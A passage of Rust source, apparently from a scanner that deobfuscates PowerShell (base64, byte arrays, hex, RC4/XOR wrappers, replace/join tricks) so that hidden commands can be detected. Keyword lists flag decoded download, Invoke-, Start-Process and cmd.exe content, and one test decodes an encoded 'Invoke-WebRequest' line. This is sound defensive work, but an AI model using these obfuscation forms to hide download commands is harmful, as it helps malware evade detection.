    }
    let matches: Vec<(usize, usize, String)> = JSON_SCRIPT_B64_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod json_script_base64_prefilter_tests {
    use super::expand_json_script_base64;

    #[test]
    fn ignores_text_without_convertfrom_json_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_json_script_base64(text), text);
    }
}

fn expand_getstring_base64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let b64 = caps.get(2)?.as_str();
            let decoded = decode_ps_base64_string(b64)?;
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn expand_getstring_base64_variables(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_B64_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str().to_ascii_lowercase();
            let var = caps.get(2)?.as_str().to_ascii_lowercase();
            let b64 = bindings.get(&var)?;
            let decoded = decode_ps_base64_string(b64)?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let value = match encoding.as_str() {
                "unicode" => decode_utf16_lossy(&decoded, false)?,
                "bigendianunicode" => decode_utf16_lossy(&decoded, true)?,
                _ => String::from_utf8_lossy(&decoded).into_owned(),
            };
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn decode_ps_base64_string(encoded: &str) -> Option<Vec<u8>> {
    let cleaned = encoded
        .chars()
        .filter(|ch| !ch.is_whitespace())
        .collect::<String>();
    if cleaned.is_empty() {
        return None;
    }
    base64::engine::general_purpose::STANDARD
        .decode(cleaned)
        .ok()
}

fn expand_getstring_byte_arrays(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring")
        || !contains_ascii_case_insensitive(text, "byte")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_BYTE_ARRAY_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let encoding = caps.get(1)?.as_str();
            let bytes = parse_ps_byte_array(caps.get(2)?.as_str())?;
            if bytes.len() > 128 * 1024 {
                return None;
            }
            let value = decode_ps_getstring_bytes(encoding, &bytes)?;
            Some((
                full.start(),
                full.end(),
                format!("'{}'", value.replace('\'', "''")),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_byte_array(nums: &str) -> Option<Vec<u8>> {
    let mut out = Vec::new();
    for part in nums.split(',') {
        let part = part.trim();
        let value = if let Some(hex) = part.strip_prefix("0x").or_else(|| part.strip_prefix("0X")) {
            u16::from_str_radix(hex, 16).ok()?
        } else {
            part.parse::<u16>().ok()?
        };
        let byte = u8::try_from(value).ok()?;
        out.push(byte);
        if out.len() > 128 * 1024 {
            return None;
        }
    }
    (!out.is_empty()).then_some(out)
}

fn decode_ps_getstring_bytes(encoding: &str, bytes: &[u8]) -> Option<String> {
    match encoding.to_ascii_lowercase().as_str() {
        "unicode" => decode_utf16_lossy(bytes, false),
        "bigendianunicode" => decode_utf16_lossy(bytes, true),
        "utf32" => decode_utf32_lossy(bytes, false),
        _ => Some(String::from_utf8_lossy(bytes).into_owned()),
    }
}

#[cfg(test)]
mod getstring_base64_prefilter_tests {
    use super::{expand_getstring_base64_literals, expand_getstring_base64_variables};

    #[test]
    fn ignores_text_without_getstring_base64_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_getstring_base64_literals(text), text);
        assert_eq!(expand_getstring_base64_variables(text), text);
    }
}

#[cfg(test)]
mod ps_literal_urls_download_context_tests {
    use super::ps_literal_urls_in_download_context;

    #[test]
    fn ignores_plain_text_without_download_context() {
        let text = "Write-Host 'https://example.com'";
        assert!(ps_literal_urls_in_download_context(text).is_empty());
    }
}

fn expand_convert_frombase64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string") {
        return text.to_string();
    }
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut cursor = 0usize;
    while let Some(name_start) = find_ascii_case_insensitive_from(text, "frombase64string", cursor)
    {
        // Walk back ~32 bytes to look for the `[...Convert]::` prefix, but
        // clamp to a UTF-8 char boundary — a fixed byte offset can land
        // inside a multi-byte char (e.g. CJK-named vars), which would panic
        // the `text[search_start..name_start]` slice below.
        let mut search_start = name_start.saturating_sub(32);
        while search_start > 0 && !text.is_char_boundary(search_start) {
            search_start -= 1;
        }
        let Some(bracket_rel) = text[search_start..name_start].rfind('[') else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let call_start = search_start + bracket_rel;
        if !contains_ascii_case_insensitive(&text[call_start..name_start], "convert]::") {
            cursor = name_start + "frombase64string".len();
            continue;
        }
        let Some(open_rel) = text[name_start..].find('(') else {
            break;
        };
        let pos = skip_ascii_ws(bytes, name_start + open_rel + 1);
        let Some((b64, quote_end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let mut end = quote_end;
        end = skip_ascii_ws(bytes, end);
        if bytes.get(end) == Some(&b')') {
            end += 1;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            cursor = name_start + "frombase64string".len();
            continue;
        };
        let decoded = decode_payload(&decoded).into_owned();
        if !contains_ascii_case_insensitive(&decoded, "http://")
            && !contains_ascii_case_insensitive(&decoded, "https://")
            && !contains_ascii_case_insensitive(&decoded, "download")
            && !contains_ascii_case_insensitive(&decoded, "frombase64string")
            && !contains_ascii_case_insensitive(&decoded, "invoke-")
        {
            cursor = end;
            continue;
        }
        let decoded = decoded.replace('\'', "''");
        matches.push((call_start, end, format!("'{decoded}'")));
        cursor = end;
    }
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod convert_frombase64_prefilter_tests {
    use super::expand_convert_frombase64_literals;

    #[test]
    fn ignores_text_without_frombase64string_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_convert_frombase64_literals(text), text);
    }

    #[test]
    fn expands_whitespace_padded_frombase64string_calls() {
        let text = r#"[System.CoNvErT]::FromBase64String(
            'SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9leGFtcGxlLmNvbQ=='
        )"#;
        let out = expand_convert_frombase64_literals(text);
        assert!(out.contains("'Invoke-WebRequest https://example.com'"));
    }
}

fn append_decoded_frombase64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string") && !text.contains('=') {
        return text.to_string();
    }
    let mut out = text.to_string();
    let mut seen = std::collections::HashSet::new();
    for caps in FROMB64_LONG_LITERAL_RE.captures_iter(text) {
        let Some(b64) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !seen.insert(b64) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        let decoded = decode_payload(&decoded);
        if contains_ascii_case_insensitive(&decoded, "http://")
            || contains_ascii_case_insensitive(&decoded, "https://")
            || contains_ascii_case_insensitive(&decoded, "download")
            || contains_ascii_case_insensitive(&decoded, "frombase64string")
        {
            out.push('\n');
            out.push_str(&decoded);
        }
    }
    out
}

fn append_decoded_rc4_wrappers(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-bxor")
        || !contains_ascii_case_insensitive(text, "frombase64string")
    {
        return text.to_string();
    }
    let Some(decoded) = decode_rc4_wrapper_from_text(text) else {
        return text.to_string();
    };
    let decoded = decode_payload(&decoded);
    if decoded.trim().is_empty() {
        return text.to_string();
    }
    let mut out = text.to_string();
    out.push('\n');
    out.push_str(&decoded);
    out
}

#[cfg(test)]
mod rc4_wrapper_prefilter_tests {
    use super::append_decoded_rc4_wrappers;

    #[test]
    fn ignores_text_without_rc4_shape() {
        let text = "Write-Host hello world";
        assert_eq!(append_decoded_rc4_wrappers(text), text);
    }
}

#[cfg(test)]
mod powershell_payload_tests {
    use super::looks_like_powershell_payload;

    #[test]
    fn rejects_plain_text_payload() {
        assert!(!looks_like_powershell_payload(b"Write-Host hello world"));
    }
}

fn decode_utf16_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 2 != 0 {
        return None;
    }
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|pair| {
            if big_endian {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .collect();
    Some(String::from_utf16_lossy(&u16s))
}

fn decode_utf32_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 4 != 0 {
        return None;
    }
    let decoded: String = bytes
        .chunks_exact(4)
        .map(|chunk| {
            let value = if big_endian {
                u32::from_be_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            } else {
                u32::from_le_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            };
            char::from_u32(value).unwrap_or(char::REPLACEMENT_CHARACTER)
        })
        .collect();
    Some(decoded)
}

fn expand_base64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string") && !text.contains('=') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[cfg(test)]
mod base64_literal_prefilter_tests {
    use super::expand_base64_literals;

    #[test]
    fn ignores_text_without_base64_literal_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_base64_literals(text), text);
    }
}

fn should_inline_base64_decoded_payload(decoded: &[u8]) -> bool {
    if decoded.is_empty() {
        return false;
    }
    let text = decode_payload(decoded);
    if contains_ascii_case_insensitive(&text, "http://")
        || contains_ascii_case_insensitive(&text, "https://")
        || contains_ascii_case_insensitive(&text, "download")
        || contains_ascii_case_insensitive(&text, "frombase64string")
        || contains_ascii_case_insensitive(&text, "invoke-")
        || contains_ascii_case_insensitive(&text, "powershell")
        || contains_ascii_case_insensitive(&text, "new-object")
        || contains_ascii_case_insensitive(&text, "start-process")
        || contains_ascii_case_insensitive(&text, "cmd.exe")
    {
        return true;
    }

    if decoded.len() > 64 * 1024 {
        return false;
    }
    let printable = decoded
        .iter()
        .filter(|b| b.is_ascii_graphic() || matches!(**b, b' ' | b'\r' | b'\n' | b'\t'))
        .count();
    let hard_controls = decoded
        .iter()
        .filter(|b| b.is_ascii_control() && !matches!(**b, b'\r' | b'\n' | b'\t'))
        .count();
    printable * 100 >= decoded.len() * 90 && hard_controls * 100 <= decoded.len()
}

#[allow(clippy::expect_used)]
static PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'''([^'\r\n]{1,8192})'''"#)
        .expect("ps embedded single quote assignment")
});

fn expand_ps_embedded_single_quote_assignments(text: &str) -> String {
    if !text.contains("'''") {
        return text.to_string();
    }
    PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE
        .replace_all(text, "$$$1=\"'$2'\"")
        .into_owned()
}

#[allow(clippy::expect_used)]
static REGEX_REPLACE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[regex\]::Replace\s*\(\s*'([^']*)'\s*,\s*''?([^']*)''?\s*,\s*''?([^']*)''?\s*\)"#,
    )
    .expect("regex replace call")
});

#[allow(clippy::expect_used)]
static B64_REGEX_REPLACE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\[regex\]::Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*'+([^']*)'+\s*,\s*'+([^']*)'+\s*\)\s*\)"#,
    )
    .expect("b64 regex replace variable call")
});

fn expand_regex_replace_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "[regex]::replace(") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = REGEX_REPLACE_CALL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let haystack = caps.get(1)?.as_str();
            let needle = caps.get(2)?.as_str();
            let repl = caps.get(3)?.as_str();
            Some((
                full.start(),
                full.end(),
                format!("'{}'", haystack.replace(needle, repl)),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod regex_replace_call_prefilter_tests {
    use super::expand_regex_replace_calls;

    #[test]
    fn ignores_text_without_regex_replace_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_regex_replace_calls(text), text);
    }
}

fn expand_regex_replace_base64_variables(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string")
        || !contains_ascii_case_insensitive(text, "[regex]::replace(")
    {
        return text.to_string();
    }
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = B64_REGEX_REPLACE_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let var = caps.get(1)?.as_str().to_ascii_lowercase();
            let needle = caps.get(2)?.as_str();
            let replacement = caps.get(3)?.as_str();
            let value = bindings.get(&var)?;
            let b64 = value.replace(needle, replacement);
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let decoded = decode_payload(&decoded).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("'{decoded}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod regex_replace_b64_prefilter_tests {
    use super::expand_regex_replace_base64_variables;

    #[test]
    fn ignores_text_without_regex_replace_base64_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_regex_replace_base64_variables(text), text);
    }
}

fn ps_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut bindings = std::collections::HashMap::new();
    let mut events: Vec<(usize, bool, String, String)> = Vec::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let Some(full) = caps.get(0) else { continue };
            events.push((
                full.start(),
                false,
                name.as_str().to_ascii_lowercase(),
                value,
            ));
        }
    }
    for caps in PS_VAR_APPEND_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let Some(full) = caps.get(0) else { continue };
            events.push((
                full.start(),
                true,
                name.as_str().to_ascii_lowercase(),
                value,
            ));
        }
    }
    events.sort_by_key(|(pos, _, _, _)| *pos);
    for (_, append, name, value) in events {
        if append {
            bindings
                .entry(name)
                .or_insert_with(String::new)
                .push_str(&value);
        } else {
            bindings.insert(name, value);
        }
    }
    bindings
}

fn expand_start_process_argument_list(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-argumentlist") {
        return text.to_string();
    }
    let mut out = text.to_string();
    let mut cursor = 0usize;
    while let Some(rel) = find_ascii_case_insensitive_from(text, "-argumentlist", cursor) {
        let pos = cursor + rel + "-argumentlist".len();
        let Some((inner, end)) = parse_ps_quoted_argument(text, pos) else {
            cursor = pos;
            continue;
        };
        let normalized = inner
            .replace("\\\"", "\"")
            .replace("`\"", "\"")
            .replace("\\'", "'");
        if contains_ascii_case_insensitive(&normalized, "frombase64string")
            || contains_ascii_case_insensitive(&normalized, "download")
            || contains_ascii_case_insensitive(&normalized, "http://")
            || contains_ascii_case_insensitive(&normalized, "https://")
        {
            out.push('\n');
            out.push_str(&normalized);
        }
        cursor = end;
    }
    out
}

#[cfg(test)]
mod start_process_argument_list_prefilter_tests {
    use super::{
        expand_start_process_argument_list, parse_ps_quoted_argument,
        parse_ps_single_quoted_literal,
    };

    #[test]
    fn ignores_text_without_argument_list_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_start_process_argument_list(text), text);
    }

    #[test]
    fn parse_ps_quoted_argument_handles_ascii_boundary_cases() {
        assert_eq!(
            parse_ps_quoted_argument("   'ab''c'", 0),
            Some(("ab'c".to_string(), 10))
        );
        assert_eq!(
            parse_ps_quoted_argument("  \"a``b\"", 0),
            Some(("a`b".to_string(), 8))
        );
        assert_eq!(
            parse_ps_quoted_argument("  \"héllo\"", 0),
            Some(("héllo".to_string(), 10))
        );
        assert_eq!(
            parse_ps_quoted_argument("  \"a`héllo\"", 0),
            Some(("ahéllo".to_string(), 12))
        );
        assert_eq!(parse_ps_quoted_argument("no quote", 0), None);
    }

    #[test]
    fn parse_ps_single_quoted_literal_handles_ascii_boundary_cases() {
        assert_eq!(
            parse_ps_single_quoted_literal("'ab''c'", 0),
            Some((7, "ab'c".to_string()))
        );
        assert_eq!(
            parse_ps_single_quoted_literal("'a`b'", 0),
            Some((5, "a`b".to_string()))
        );
        assert_eq!(
            parse_ps_single_quoted_literal("'héllo'", 0),
            Some((8, "héllo".to_string()))
        );
        assert_eq!(parse_ps_single_quoted_literal("no quote", 0), None);
    }
}

fn parse_ps_quoted_argument(text: &str, start: usize) -> Option<(String, usize)> {
    let bytes = text.as_bytes();
    let mut pos = start;
    while bytes.get(pos).is_some_and(|b| b.is_ascii_whitespace()) {
        pos += 1;
    }
    let &quote = bytes.get(pos)?;
    if quote != b'\'' && quote != b'"' {
        return None;
    }
    pos += 1;
    let mut out = String::new();
    while pos < bytes.len() {
        let byte = bytes[pos];
        if byte.is_ascii() && byte != quote && byte != b'`' {
            out.push(byte as char);
            pos += 1;
            continue;
        }
        let (ch, ch_len) = next_char_at(text, pos)?;
        pos += ch_len;
        if ch == quote as char {
            if quote == b'\'' && bytes.get(pos) == Some(&b'\'') {
                out.push('\'');
                pos += 1;
                continue;
            }
            return Some((out, pos));
        }
        if quote == b'"' && ch == '`' {
            if let Some(&next_byte) = bytes.get(pos) {
                if next_byte.is_ascii() {
                    out.push(next_byte as char);
                    pos += 1;
                    continue;
                }
                if let Some((next, next_len)) = text[pos..]
                    .chars()
                    .next()
                    .map(|next| (next, next.len_utf8()))
                {
                    out.push(next);
                    pos += next_len;
                    continue;
                }
            }
        }
        out.push(ch);
    }
    None
}

#[allow(clippy::expect_used)]
static HEX_SPLIT_CHAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)'((?:[0-9a-f]{2}\s+){3,}[0-9a-f]{2})'\s*-Split\s*['"][^'"]*['"]\s*(?:\|\s*)?foreach(?:-object)?\s*\{[^{}]*?toint16\s*\(\s*\$_\s*,\s*16\s*\)[^{}]*?\}"#,
    )
    .expect("hex split char loop")
});

fn expand_hex_split_char_loop(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-split")
        || !contains_ascii_case_insensitive(text, "toint16")
    {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = HEX_SPLIT_CHAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let hex = caps.get(1)?.as_str();
            let bytes: Vec<u8> = hex
                .split_whitespace()
                .filter_map(|part| u8::from_str_radix(part, 16).ok())
                .collect();
            if bytes.is_empty() {
                return None;
            }
            let decoded = String::from_utf8_lossy(&bytes).into_owned();
            Some((full.start(), full.end(), format!("'{}'", decoded)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod hex_split_char_prefilter_tests {
    use super::expand_hex_split_char_loop;

    #[test]
    fn ignores_text_without_hex_split_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_hex_split_char_loop(text), text);
    }
}

#[allow(clippy::expect_used)]
static GETSTRING_UNWRAP_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[(?:System\.)?(?:Text\.)?Encoding\]::(?:UTF8|ASCII|Unicode|UTF7|BigEndianUnicode|UTF32)\.GetString\s*\(\s*'([^']*)'\s*\)"
    ).expect("getstring unwrap")
});

fn expand_getstring_wrapper(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "getstring(") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = GETSTRING_UNWRAP_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let inner = caps.get(1)?.as_str();
            Some((full.start(), full.end(), format!("'{}'", inner)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod getstring_wrapper_prefilter_tests {
    use super::expand_getstring_wrapper;

    #[test]
    fn ignores_text_without_getstring_wrapper_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_getstring_wrapper(text), text);
    }
}

#[allow(clippy::expect_used)]
static REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'\s*-replace\s*'([^'\\]*(?:\\.[^'\\]*)*)'\s*,\s*'([^'\\]*(?:\\.[^'\\]*)*)'"#)
        .expect("replace")
});

fn expand_ps_replace(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-replace") {
        return text.to_string();
    }
    let mut out = text.to_string();
    // Run repeatedly so chained -replace ('a' -replace 'x','y' -replace 'z','w') works.
    loop {
        let mut hit = false;
        let next: Vec<(usize, usize, String)> = REPLACE_RE
            .captures_iter(&out)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let haystack = caps.get(1)?.as_str();
                let needle = caps.get(2)?.as_str();
                let repl = caps.get(3)?.as_str();
                let new_str = haystack.replace(needle, repl);
                Some((full.start(), full.end(), format!("'{}'", new_str)))
            })
            .collect();
        if next.is_empty() {
            break;
        }
        for (start, end, replacement) in next.into_iter().rev() {
            out.replace_range(start..end, &replacement);
            hit = true;
        }
        if !hit {
            break;
        }
    }
    out
}

#[cfg(test)]
mod ps_replace_prefilter_tests {
    use super::expand_ps_replace;

    #[test]
    fn ignores_text_without_replace_operator() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_ps_replace(text), text);
    }
}

fn expand_ps_dot_replace(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, ".replace(") {
        return text.to_string();
    }
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut start = 0;
    while let Some(rel) = text[start..].find('\'') {
        let literal_start = start + rel;
        let Some((literal_end, haystack)) = parse_ps_single_quoted_literal(text, literal_start)
        else {
            start = literal_start + 1;
            continue;
        };

        let mut pos = skip_ascii_ws(bytes, literal_end);
        if bytes.get(pos) != Some(&b'.') {
            start = literal_end;
            continue;
        }
        pos += 1;
        let Some(after_dot) = text.get(pos..) else {
            start = literal_end;
            continue;
        };
        let Some(method) = after_dot.get(.."Replace".len()) else {
            start = literal_end;
            continue;
        };
        if !method.eq_ignore_ascii_case("Replace") {
            start = literal_end;
            continue;
        }
        pos += "Replace".len();
        pos = skip_ascii_ws(bytes, pos);
        if bytes.get(pos) != Some(&b'(') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((needle_end, needle)) = parse_ps_single_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, needle_end);
        if bytes.get(pos) != Some(&b',') {
            start = literal_end;
            continue;
        }
        pos = skip_ascii_ws(bytes, pos + 1);
        let Some((repl_end, repl)) = parse_ps_single_quoted_literal(text, pos) else {
            start = literal_end;
            continue;
        };
        pos = skip_ascii_ws(bytes, repl_end);
        if bytes.get(pos) != Some(&b')') {
            start = literal_end;
            continue;
        }
        let replaced = haystack.replace(&needle, &repl);
        matches.push((literal_start, pos + 1, format!("'{}'", replaced)));
        start = pos + 1;
    }

    let mut out = text.to_string();
    for (start_pos, end_pos, replacement) in matches.into_iter().rev() {
        out.replace_range(start_pos..end_pos, &replacement);
    }
    out
}

#[cfg(test)]
mod ps_dot_replace_prefilter_tests {
    use super::expand_ps_dot_replace;

    #[test]
    fn ignores_text_without_dot_replace_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_ps_dot_replace(text), text);
    }
}

#[allow(clippy::expect_used)]
static JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    // (?:'a',"b",'c') -join 'sep' or @('a',"b",'c') -join "sep".
    // Outer parens are optional for the bare array form.
    Regex::new(r#"@?\(?\s*((?:(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*,\s*)+(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*"))\s*\)?\s*-join\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")"#)
        .expect("join")
});

#[allow(clippy::expect_used)]
static JOIN_PART_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)""#).expect("join part")
});

#[allow(clippy::expect_used)]
static SINGLE_LITERAL_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"\(\s*(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")\s*\)|(?:'([^'\\]*(?:\\.[^'\\]*)*)'|"([^"\\]*(?:\\.[^"\\]*)*)")\s*-join\s*(?:'[^'\\]*(?:\\.[^'\\]*)*'|"[^"\\]*(?:\\.[^"\\]*)*")"#,
    )
    .expect("single literal join")
});

fn expand_single_literal_join(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "-join") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = SINGLE_LITERAL_JOIN_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            if previous_non_whitespace_ascii_byte(text, full.start()) == Some(b',') {
                return None;
            }
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))?
                .as_str();
            Some((full.start(), full.end(), format!("'{}'", value)))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod single_literal_join_prefilter_tests {
    use super::{
        expand_reverse_string_slice_join, expand_single_literal_join,
        expand_tochararray_reverse_join, previous_non_whitespace_ascii_byte,
    };

    #[test]
    fn ignores_text_without_join_operator() {
        let text = "Write-Host hello world";
        assert_eq!(expand_single_literal_join(text), text);
        assert_eq!(expand_reverse_string_slice_join(text), text);
    }

    #[test]
    fn previous_non_whitespace_ascii_byte_handles_ascii_whitespace() {
        assert_eq!(previous_non_whitespace_ascii_byte("ab , \t", 6), Some(b','));
        assert_eq!(previous_non_whitespace_ascii_byte("   ", 3), None);
    }

    #[test]
    fn reverse_join_helpers_handle_ascii_and_unicode_literals() {
        let ascii = "'abcd'[-1..-2]-join''";
        assert_eq!(expand_reverse_string_slice_join(ascii), "'dc'");

        let unicode = "'héllo'[-1..-3]-join''";
        assert_eq!(expand_reverse_string_slice_join(unicode), "'oll'");

        let tochar = "$x='abcd';$y=$x.ToCharArray();[array]::Reverse($y);$z=-join($y)";
        assert_eq!(
            expand_tochararray_reverse_join(tochar),
            "$x='abcd';$y=$x.ToCharArray();[array]::Reverse($y);$z='dcba'"
        );
    }
}

#[allow(clippy::expect_used)]
static REVERSE_STRING_SLICE_JOIN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
